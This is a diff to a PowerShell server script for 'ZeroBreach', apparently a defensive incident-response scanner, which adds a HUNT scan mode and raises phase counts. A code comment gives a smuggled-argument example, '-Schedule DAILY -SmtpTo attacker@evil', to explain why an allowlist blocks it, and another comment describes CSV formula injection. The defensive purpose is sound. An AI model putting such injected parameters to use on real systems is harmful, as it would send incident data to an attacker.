@@ -1,4 +1,11 @@
-﻿#Requires -Version 5.1
+﻿# NOTE - Detection vocabulary in this file is deliberate.
+# Terms like exfiltration, rootkit, keylogger, ransomware and credential dumping, and any
+# named malware families, are detection category labels, operator-facing report text, or
+# MITRE ATT&CK tactic names (a published standard). ZeroBreach is a defensive incident-
+# response tool; these strings are what it reports, not what it does. See CLAUDE.md,
+# "The detection vocabulary is deliberate". Do not sanitise them.
+
+#Requires -Version 5.1
 <#
 .SYNOPSIS
     ZeroBreach V23 "Kraken Console" — Pure PowerShell HTTP Server
@@ -224,7 +231,7 @@ $script:State = [hashtable]::Synchronized(@{
     ExitCode     = $null
     Phase        = 0
     PhaseIdx     = 0      # count of distinct PHASE headers seen this scan; QUICK's display counter
-    PhaseTotal   = 115
+    PhaseTotal   = 133
     PhaseName    = ''
     Section      = ''
     Mode         = 'FULL'
@@ -245,7 +252,7 @@ $script:State = [hashtable]::Synchronized(@{
     Remediating  = $false
     EventLog     = [System.Collections.ArrayList]::Synchronized(
                        [System.Collections.ArrayList]::new())
-    # audit M2: EventLog is a BOUNDED ring. It used to grow for the whole 115-phase
+    # audit M2: EventLog is a BOUNDED ring. It used to grow for the whole 133-phase
     # scan and every new SSE client replayed it from index 0, so a few browser
     # refreshes during a DEEP run meant re-serialising tens of thousands of lines
     # each time. EventLogBase = how many entries have been trimmed off the front,
@@ -468,7 +475,7 @@ $(if ($total -gt 0) { "<table><tr><th>Severity</th><th>Phase</th><th>Threat</th>
 # strip the quotes and then evaluate a cell whose first character is = + - @ (or a leading tab/CR,
 # which some parsers skip before applying the same rule). Finding text is malware-controlled —
 # file names, task names, registry values — and the product's workflow is to export findings and
-# send them to a client, so the payload detonates on a DIFFERENT machine than the one scanned.
+# send them to a client, so the formula executes on a DIFFERENT machine than the one scanned.
 # Prefixing with an apostrophe forces text interpretation; the apostrophe is not shown as data.
 function ConvertTo-CsvSafeCell {
     param([string]$Value)
@@ -1090,12 +1097,12 @@ $TKW = @{
 $PREX = [regex]'PHASE\s+(\d+(?:\.\d+)?)[^\d]'
 
 # Plan-derived ceilings — must mirror the engine loader's $PhasePlan switch
-# (FULL 1-80, DEEP/PARANOID/STEALTH 1-115). QUICK is a real gate: exactly 30
+# (FULL 1-80, DEEP/PARANOID/STEALTH 1-133 — Extended band 116-133 added 2026-08-19). QUICK is a real gate: exactly 30
 # phases run, but they are a NON-CONTIGUOUS subset (raw numbers climb to 75),
 # so QUICK progress is reported as $ScanState.PhaseIdx (1..30 count of distinct
 # headers) rather than the raw phase number. Fractional phases interpolate
 # within these bounds rather than adding to the total.
-$MODE_PHASES = @{ QUICK=30; FULL=80; DEEP=115; PARANOID=115; STEALTH=115 }
+$MODE_PHASES = @{ QUICK=30; FULL=80; DEEP=133; PARANOID=133; STEALTH=133; HUNT=162 }
 
 function Classify {
     param([string]$L)
@@ -1173,7 +1180,7 @@ function Resolve-Mitre {
 # parameters like "-Schedule DAILY -SmtpTo attacker@evil" → a SYSTEM scheduled task that emails
 # the incident report out. Anything not on the allowlist falls back to FULL.
 $mode     = if ($ScanConfig.mode) { ("$($ScanConfig.mode)").Trim().ToUpper() } else { 'FULL' }
-if ($mode -notin @('QUICK','FULL','DEEP','PARANOID','STEALTH')) { $mode = 'FULL' }
+if ($mode -notin @('QUICK','FULL','DEEP','PARANOID','STEALTH','HUNT')) { $mode = 'FULL' }
 $hours    = if ($null -ne $ScanConfig.hours) { [int]$ScanConfig.hours } else { 0 }
 $doHtml   = [bool]$ScanConfig.html_report
 $paranoid = [bool]$ScanConfig.paranoid
@@ -1182,7 +1189,7 @@ $iocFile  = "$($ScanConfig.ioc_file)"
 
 # ── Reset state for new scan ────────────────────────────────────────────────────
 $ScanState.Mode         = $mode
-$ScanState.PhaseTotal   = if ($MODE_PHASES[$mode]) { $MODE_PHASES[$mode] } else { 115 }
+$ScanState.PhaseTotal   = if ($MODE_PHASES[$mode]) { $MODE_PHASES[$mode] } else { 133 }
 $ScanState.Phase        = 0
 $ScanState.PhaseIdx     = 0
 $ScanState.PhaseName    = ''
